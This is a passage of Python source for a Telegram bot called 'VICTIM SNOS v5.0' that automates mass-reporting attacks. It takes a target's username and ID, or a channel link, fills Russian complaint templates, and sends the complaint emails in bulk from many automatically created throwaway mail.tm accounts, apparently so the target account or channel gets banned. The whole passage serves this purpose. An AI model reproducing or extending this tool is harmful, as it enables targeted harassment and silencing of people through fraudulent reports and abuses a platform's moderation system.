        f"<b>VICTIM SNOS</b>\n\nСессии: {len(sessions_pool)}/{MAX_SESSIONS}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
        get_main_menu()
    )
    await cb.answer()


@dp.callback_query(F.data.startswith("acc_"))
async def comp_acc_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("acc_", "")
    await state.update_data(complaint_type=complaint_type)
    
    if complaint_type == "1.1":
        await state.set_state(ComplaintAccountState.waiting_reason)
        await cb.message.edit_text(
            "<b>ОБЫЧНАЯ ЖАЛОБА</b>\n\nВведите причину жалобы:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="comp_acc")]])
        )
    else:
        await state.set_state(ComplaintAccountState.waiting_username)
        await cb.message.edit_text(
            "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="comp_acc")]])
        )
    await cb.answer()


@dp.message(StateFilter(ComplaintAccountState.waiting_reason))
async def comp_acc_reason(msg: types.Message, state: FSMContext):
    await state.update_data(reason=msg.text.strip())
    await state.set_state(ComplaintAccountState.waiting_username)
    await msg.answer("Введите юзернейм (без @):")


@dp.message(StateFilter(ComplaintAccountState.waiting_username))
async def comp_acc_username(msg: types.Message, state: FSMContext):
    await state.update_data(username=msg.text.strip().replace("@", ""))
    await state.set_state(ComplaintAccountState.waiting_id)
    await msg.answer("Введите Telegram ID:")


@dp.message(StateFilter(ComplaintAccountState.waiting_id))
async def comp_acc_id(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    username = data.get("username", "")
    telegram_id = msg.text.strip()
    complaint_type = data.get("complaint_type", "1.2")
    reason = data.get("reason", "")
    
    body = COMPLAINT_TEXTS_ACCOUNT[complaint_type].format(
        username=username, telegram_id=telegram_id, reason=reason
    )
    
    st = await msg.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint(mail_tm, f"Жалоба на @{username}", body)
    await st.delete()
    
    await msg.answer(f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nID: {telegram_id}\nОтправлено: {sent} писем")
    await send_banner(msg, "<b>Главное меню</b>", get_main_menu())


# Жалобы на канал
@dp.callback_query(F.data == "comp_chan")
async def comp_chan_menu(cb: types.CallbackQuery):
    if not mail_tm.ready:
        await cb.answer("Почта загружается!", show_alert=True)
        return
    await edit_banner(cb, "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВыберите тип жалобы:", get_channel_complaint_menu())
    await cb.answer()


@dp.callback_query(F.data == "comp_chan_back")
async def comp_chan_back(cb: types.CallbackQuery):
    await edit_banner(
        cb,
        f"<b>VICTIM SNOS</b>\n\nСессии: {len(sessions_pool)}/{MAX_SESSIONS}\nПочта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
        get_main_menu()
    )
    await cb.answer()


@dp.callback_query(F.data.startswith("chan_"))
async def comp_chan_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("chan_", "")
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(ComplaintChannelState.waiting_channel)
    await cb.message.edit_text(
        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="comp_chan")]])
    )
    await cb.answer()


@dp.message(StateFilter(ComplaintChannelState.waiting_channel))
async def comp_chan_link(msg: types.Message, state: FSMContext):
    await state.update_data(channel=msg.text.strip())
    await state.set_state(ComplaintChannelState.waiting_violation)
    await msg.answer("Введите ссылку на нарушение:")


@dp.message(StateFilter(ComplaintChannelState.waiting_violation))
async def comp_chan_violation(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    channel = data.get("channel", "")
    violation = msg.text.strip()
    complaint_type = data.get("complaint_type", "8")
    
    body = COMPLAINT_TEXTS_CHANNEL[complaint_type].format(
        channel_link=channel, violation_link=violation
    )
    
    st = await msg.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint(mail_tm, "Жалоба на канал", body)
    await st.delete()
    
    await msg.answer(f"<b>ГОТОВО!</b>\n\nКанал: {channel}\nОтправлено: {sent} писем")
    await send_banner(msg, "<b>Главное меню</b>", get_main_menu())


@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    await edit_banner(cb, "<b>Остановлено</b>", get_main_menu())
    await cb.answer()


# ---------- ЗАПУСК ----------
mail_tm = MailTM()


async def init_mailtm():
    try:
        with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
            mail_tm.accounts = json.load(f)
            mail_tm.ready = True
            logger.info(f"Загружено {len(mail_tm.accounts)} почт")
    except:
        logger.info("Создание почт...")
        await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
        if mail_tm.accounts:
            with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                json.dump(mail_tm.accounts, f)


async def main():
    logger.info("VICTIM SNOS v5.0 запуск...")
    await bot.delete_webhook(drop_pending_updates=True)
    
    asyncio.create_task(init_sessions_background())
    asyncio.create_task(init_mailtm())
    
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
